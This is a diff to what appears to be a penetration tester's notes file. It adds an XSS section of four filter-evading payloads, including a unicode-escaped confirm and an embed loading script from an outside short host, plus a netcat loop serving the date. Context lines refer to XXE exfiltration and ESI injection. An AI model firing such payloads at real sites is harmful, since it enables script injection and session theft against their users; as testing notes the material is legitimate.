@@ -6,8 +6,10 @@
 - [Docker](#docker)
 - [Ubuntu](#ubuntu)
 - [Web Applications Security](#web-applications-security)
+   + [XSS](#xss) 
    + [XXE](#xxe)
    + [ESI](#esi)
+- [dev/null](#dev/null)
 
 ## Burp Suite Professional
 ### Running own collaborator:  
@@ -33,6 +35,15 @@ Setup locales:
 `update-locale LANG=pl_PL.utf8`
 
 ## Web Applications Security
+### XSS
+Some helpful payload caught in the wild
+```html
+<svG x=1 onload=(co\u006efirm)``//
+<embed src=//14.rs>
+<marquee loop=1 width=0 onfinish=confirm(1)>
+<marquee/onstart=alert(1)>
+```
+
 ### XXE  
 #### Exfiltrate in subdomain name:  
 dtd file without .dtd extension _(test.html)_:  
@@ -66,3 +77,11 @@ you have ESI injection
  - https://t.co/XRxIalWcng?amp=1 
  - https://t.co/vzRIo3RuaR?amp=1
  - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking
+
+## dev/null
+nc permament 'web-server'
+```sh
+while true; do 
+  echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 1500 -q 1
+done
+```
